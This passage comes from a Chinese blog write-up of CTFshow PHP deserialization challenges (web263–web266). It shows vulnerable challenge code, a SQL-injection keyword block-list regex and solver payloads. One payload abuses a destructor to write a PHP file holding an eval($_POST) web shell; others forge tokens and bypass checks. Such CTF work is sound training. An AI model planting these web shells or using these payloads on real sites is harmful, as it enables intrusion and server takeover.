    &#39;database_name&#39; =&gt; &#39;web&#39;,
    &#39;server&#39; =&gt; &#39;localhost&#39;,
    &#39;username&#39; =&gt; &#39;root&#39;,
    &#39;password&#39; =&gt; &#39;root&#39;,
    &#39;charset&#39; =&gt; &#39;utf8&#39;,
    &#39;port&#39; =&gt; 3306,
    &#39;prefix&#39; =&gt; &#39;&#39;,
    &#39;option&#39; =&gt; [
        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL
    ]
]);

// sql注入检查
function checkForm($str)&#123;
    if(!isset($str))&#123;
        return true;
    &#125;else&#123;
    return preg_match(&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#39;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;,$str);
    &#125;
&#125;


class User&#123;
    public $username;
    public $password;
    public $status;
    function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    function setStatus($s)&#123;
        $this-&gt;status=$s;
    &#125;
    function __destruct()&#123;
        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));
    &#125;
&#125;

/*生成唯一标志
*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)
*/

function  uuid()  
&#123;  
    $chars = md5(uniqid(mt_rand(), true));  
    $uuid = substr ( $chars, 0, 8 ) . &#39;-&#39;
            . substr ( $chars, 8, 4 ) . &#39;-&#39; 
            . substr ( $chars, 12, 4 ) . &#39;-&#39;
            . substr ( $chars, 16, 4 ) . &#39;-&#39;
            . substr ( $chars, 20, 12 );  
    return $uuid ;  
&#125;  
</code></pre><p>这里可以反序列化后可以写文件</p><pre><code class="php">&lt;?php
class User&#123;
    public $username=&#39;2.php&#39;;
    public $password = &#39;&lt;?php phpinfo();eval($_POST[1]);?&gt;&#39;;
&#125;
$a=new User();

echo  base64_encode(&quot;|&quot;.serialize($a));
//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs/PiI7fQ==
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183010822.png" alt="image-20230304183010822"></p><p>然后访问一下check.php</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183043807.png" alt="image-20230304183043807"></p><p>最后访问log-2.php</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183112672.png" alt="image-20230304183112672"></p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>index.php</p><pre><code class="php">&lt;?php
error_reporting(0);
session_start();

class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

$f = $_GET[&#39;f&#39;];
$m = $_GET[&#39;m&#39;];
$t = $_GET[&#39;t&#39;];

if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
    $_SESSION[&#39;msg&#39;]=base64_encode($umsg);
    echo &#39;Your message has been sent&#39;;
&#125;

highlight_file(__FILE__);
</code></pre><p>message.php</p><pre><code class="php">&lt;?php
session_start();
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

if(isset($_COOKIE[&#39;msg&#39;]))&#123;
    $msg = unserialize(base64_decode($_SESSION[&#39;msg&#39;]));
    if($msg-&gt;token==&#39;admin&#39;)&#123;
        echo $flag;
    &#125;
&#125;
</code></pre><p>看了半天才反应过来，这里少了一个setcookie(‘msg’,base64_encode($umsg));，做法稍微有一点改动</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110134330.png" alt="image-20230305110134330"></p><p>首先在首页将payload传入，payload为什么是这样的详看262，这里访问后会有一个session，带着这个session访问message即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110259089.png" alt="image-20230305110259089"></p><p>还得加上msg</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><pre><code class="php">&lt;?php
error_reporting(0);
include(&#39;flag.php&#39;);
highlight_file(__FILE__);
class ctfshowAdmin&#123;
    public $token;
    public $password;

    public function __construct($t,$p)&#123;
        $this-&gt;token=$t;
        $this-&gt;password = $p;
    &#125;
    public function login()&#123;
        return $this-&gt;token===$this-&gt;password;
    &#125;
&#125;

$ctfshow = unserialize($_GET[&#39;ctfshow&#39;]);
$ctfshow-&gt;token=md5(mt_rand());

if($ctfshow-&gt;login())&#123;
    echo $flag;
&#125;
</code></pre><p>在本题中，token的值在最后会改变，这里修改passwd的值为token的引用即可</p><pre><code class="php">&lt;?php
class ctfshowAdmin&#123;
    public $token;
    public $password;

    public function __construct()&#123;
        $this-&gt;password = &amp;$this-&gt;token;
    &#125;
&#125;

$a = new ctfshowAdmin();
echo urlencode(serialize($a));
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305122631830.png" alt="image-20230305122631830"></p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><pre><code class="php">&lt;?php
highlight_file(__FILE__);

include(&#39;flag.php&#39;);
$cs = file_get_contents(&#39;php://input&#39;);

class ctfshow&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    public function login()&#123;
        return $this-&gt;username===$this-&gt;password;
    &#125;
    public function __toString()&#123;
        return $this-&gt;username;
    &#125;
    public function __destruct()&#123;
        global $flag;
        echo $flag;
    &#125;
&#125;
$ctfshowo=@unserialize($cs);
if(preg_match(&#39;/ctfshow/&#39;, $cs))&#123;
    throw new Exception(&quot;Error $ctfshowo&quot;,1);
&#125;
</code></pre><p>这个题换了一种传参的方式，file_get_contents(‘php:&#x2F;&#x2F;input’);，通过使用伪协议读取post数据，然后又利用了一个大小写不敏感</p><p>pyaload：</p><pre><code class="php">&lt;?php
class ctfshow&#123;
&#125;

$a = new ctfshow();
echo serialize($a);
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305134607238.png" alt="image-20230305134607238"></p><p>后面的跟前面的区别稍微有点大，另起一篇做一个简单的总结</p><div class="tags"><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="ic i-tag"></i> php反序列化</a></div></div><footer><div class="meta"><span id="2023/03/05/php反序列化/" class="item leancloud_visitors" data-flag-title="CTFshow-web入门php反序列化" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CTFshow-web入门php反序列化">https://blog.xcu.icu/2023/03/05/php反序列化/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;150.jpg" title="小端序标记法"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> REVERSE</span><h3>小端序标记法</h3></a></div><div class="item right"><a href="/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;7.jpg" title="python的序列化和反序列化"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Python</span><h3>python的序列化和反序列化</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web254"><span class="toc-number">2.</span> <span class="toc-text">web254</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web255"><span class="toc-number">3.</span> <span class="toc-text">web255</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web256"><span class="toc-number">4.</span> <span class="toc-text">web256</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web257"><span class="toc-number">5.</span> <span class="toc-text">web257</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web258"><span class="toc-number">6.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web259-SocapClient"><span class="toc-number">7.</span> <span class="toc-text">web259-SocapClient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web260"><span class="toc-number">8.</span> <span class="toc-text">web260</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web261"><span class="toc-number">9.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web262"><span class="toc-number">10.</span> <span class="toc-text">web262</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">10.1.</span> <span class="toc-text">反序列化字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0"><span class="toc-number">10.1.1.</span> <span class="toc-text">增加</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%8F%E5%B0%91"><span class="toc-number">10.1.2.</span> <span class="toc-text">减少</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web263"><span class="toc-number">11.</span> <span class="toc-text">web263</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web264"><span class="toc-number">12.</span> <span class="toc-text">web264</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web265"><span class="toc-number">13.</span> <span class="toc-text">web265</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web266"><span class="toc-number">14.</span> <span class="toc-text">web266</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="CTFshow-web入门信息收集">CTFshow-web入门信息收集</a></li><li><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" rel="bookmark" title="CTFshow-web入门命令执行补充">CTFshow-web入门命令执行补充</a></li><li><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></li><li><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></li><li><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" rel="bookmark" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></li><li class="active"><a href="/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="CTFshow-web入门php反序列化">CTFshow-web入门php反序列化</a></li><li><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="yii反序列化">yii反序列化</a></li><li><a href="/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="bookmark" title="JavaScript原型链污染">JavaScript原型链污染</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">39</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="主动信息收集">主动信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/05/16/CommonsCollections-1/" title="ConmonsCollection-1">ConmonsCollection-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/12/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/" title="数据库的完整性">数据库的完整性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="php反序列化">php反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/" title="数据库设计">数据库设计</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2023/04/05/GKCTF2020/" title="GKCTF2020WP">GKCTF2020WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" title="php:&#x2F;&#x2F;filter过exit">php://filter过exit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/03/26/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2022/11/04/Billu_b0x%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Billu_b0x打靶记录">Billu_b0x打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2023/06/01/ISCC2023/" title="ISCC2023">ISCC2023</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">578k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:45</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/03/05/php反序列化/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->